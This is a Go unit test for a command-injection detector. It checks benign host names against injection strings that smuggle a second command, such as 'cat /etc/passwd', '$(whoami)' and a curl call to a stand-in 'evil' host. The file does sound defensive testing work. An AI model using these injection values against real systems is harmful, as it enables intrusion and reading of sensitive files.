package detector_test

import (
	"testing"

	"github.com/m-mizutani/gt"
	"github.com/m-mizutani/semgate-example/pkg/domain/detector"
	"github.com/m-mizutani/semgate-example/pkg/domain/model"
)

func TestCommand_Inspect(t *testing.T) {
	d := detector.NewCommand()

	testCases := map[string]struct {
		host      string
		wantFired bool
	}{
		"benign host":            {host: "example.com", wantFired: false},
		"benign host with dash":  {host: "my-host.internal", wantFired: false},
		"benign unmatched quote": {host: "it's-a-host", wantFired: false},
		"semicolon extra cmd":    {host: "example.com; cat /etc/passwd", wantFired: true},
		"pipe to command":        {host: "example.com | id", wantFired: true},
		"command substitution":   {host: "$(whoami)", wantFired: true},
		"backtick substitution":  {host: "`id`", wantFired: true},
		"logical and":            {host: "x && curl http://evil", wantFired: true},
		"background separator":   {host: "x & id", wantFired: true},
	}

	for name, tc := range testCases {
		t.Run(name, func(t *testing.T) {
			v := d.Inspect(tc.host)
			wantFired(t, v.Fired, tc.wantFired)
			if tc.wantFired {
				gt.Value(t, v.Category).Equal(model.CategoryCommandInjection)
				gt.String(t, v.Detail).IsNotEmpty()
			}
		})
	}
}
